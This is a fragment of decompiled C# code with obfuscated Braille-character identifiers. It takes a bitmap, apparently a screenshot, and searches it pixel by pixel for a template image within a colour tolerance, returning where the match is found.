    public static Point \u287A\u2848\u28CB\u288D\u283A\u284C\u2881\u28BE\u282E\u2829\u282C\u2847\u2878\u28BA\u28C8\u2858\u2887\u2818\u2881\u286B\u287F\u287D\u287C\u287B\u2859\u2880\u288C\u2871\u283A\u282B\u28C8\u28D9\u2848\u2858\u2820\u28A3\u2885\u28CD\u28AC\u2872\u28A0\u289A\u28D6\u28C3\u28DD\u284A\u2833\u28C0\u2831\u285B\u2837\u2879\u288B\u28D5\u285C\u28DD\u28AB\u2850\u2834\u289A\u289F\u2810\u2884()
    {
      Bitmap bitmap = \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u280A\u287A\u2826\u28A9\u2854\u289B\u280B\u2871\u287A\u2807\u28BE\u2842\u2878\u2824\u280C\u2829\u2891\u28AC\u289B\u2819\u28B4\u28BF\u2892\u282C\u2861();
      \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u283D\u28D0\u28AE\u2840\u28BD\u28BF\u2891\u2824\u2858\u283E\u2857\u284C\u2842\u28C5\u2835\u281A\u283F\u28CB\u28B4\u2821\u2841\u283A\u281D\u2844\u28B5 = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u287E\u2842\u28B3\u2845\u2871\u287E\u28A2\u28D0\u2891\u283B\u288E\u2832\u2823\u281A\u28A9\u284D\u2849\u281A\u2835\u282D\u2875\u2821\u288E\u2892\u28AE\u2812\u2835\u28CE(out \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u289C\u2892\u28D4\u2828\u2846\u28D7\u28A7\u281C\u2893\u28BC\u28BF\u2828\u2896\u28C0\u2825\u2841\u2879\u28B6\u2809\u28B3\u288D\u2897\u2884);
      Point location = \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u2841\u2833\u28DE\u281F\u289A\u2824\u28B3\u289A\u284B\u280F\u28AA\u28C5\u2886\u2899\u287E\u280F\u284C\u28AC\u283F\u28BE\u28D3\u284E\u284E(bitmap, \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u283D\u28D0\u28AE\u2840\u28BD\u28BF\u2891\u2824\u2858\u283E\u2857\u284C\u2842\u28C5\u2835\u281A\u283F\u28CB\u28B4\u2821\u2841\u283A\u281D\u2844\u28B5, 0.2).Location;
      Point point = new Point(location.X, location.Y);
      bool flag = false;
      while (flag)
        flag = false;
      try
      {
        \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u283D\u28D0\u28AE\u2840\u28BD\u28BF\u2891\u2824\u2858\u283E\u2857\u284C\u2842\u28C5\u2835\u281A\u283F\u28CB\u28B4\u2821\u2841\u283A\u281D\u2844\u28B5.Dispose();
        bitmap.Dispose();
      }
      catch (Exception ex)
      {
      }
      return point;
    }

    public static unsafe Rectangle \u2841\u2833\u28DE\u281F\u289A\u2824\u28B3\u289A\u284B\u280F\u28AA\u28C5\u2886\u2899\u287E\u280F\u284C\u28AC\u283F\u28BE\u28D3\u284E\u284E(
      Bitmap _param0,
      Bitmap _param1,
      double _param2)
    {
      Rectangle empty = Rectangle.Empty;
      try
      {
        BitmapData bitmapdata1 = _param0.LockBits(new Rectangle(0, 0, _param0.Width, _param0.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
        BitmapData bitmapdata2 = _param1.LockBits(new Rectangle(0, 0, _param1.Width, _param1.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
        int stride1 = bitmapdata1.Stride;
        int stride2 = bitmapdata2.Stride;
        int width1 = _param1.Width;
        int num1 = _param1.Height - _param0.Height + 1;
        int num2 = _param0.Width * 3;
        int height = _param0.Height;
        int int32 = Convert.ToInt32((double) byte.MaxValue * _param2);
        byte* numPtr1 = (byte*) (void*) bitmapdata1.Scan0;
        byte* numPtr2 = (byte*) (void*) bitmapdata2.Scan0;
        int width2 = _param0.Width;
        int num3 = stride2 - _param1.Width * 3;
        bool flag = true;
        for (int index1 = 0; index1 < num1; ++index1)
        {
          for (int index2 = 0; index2 < width1; ++index2)
          {
            byte* numPtr3 = numPtr2;
            byte* numPtr4 = numPtr1;
            for (int index3 = 0; index3 < height; ++index3)
            {
              flag = true;
              for (int index4 = 0; index4 < num2; ++index4)
              {
                int num4 = (int) *numPtr2 - int32;
                if ((int) *numPtr2 + int32 < (int) *numPtr1 || num4 > (int) *numPtr1)
                {
                  flag = false;
                  break;
                }
                ++numPtr2;
                ++numPtr1;
              }
              if (flag)
              {
                byte* numPtr5 = numPtr4;
                byte* numPtr6 = numPtr3;
                numPtr1 = numPtr5 + ((IntPtr) stride1 * (1 + index3)).ToInt64();
                numPtr2 = numPtr6 + ((IntPtr) stride2 * (1 + index3)).ToInt64();
              }
              else
                break;
            }
            if (flag)
            {
              empty.X = index2;
              empty.Y = index1;
              empty.Width = _param0.Width;
              empty.Height = _param0.Height;
              break;
            }
            byte* numPtr7 = numPtr3;
            numPtr1 = numPtr4;
            numPtr2 = numPtr7 + 3;
          }
          if (!flag)
            numPtr2 += num3;
          else
            break;
        }
        _param1.UnlockBits(bitmapdata2);
        _param0.UnlockBits(bitmapdata1);
      }
      catch (Exception ex)
      {
        return Rectangle.Empty;
      }
      return empty;
    }
  }
}
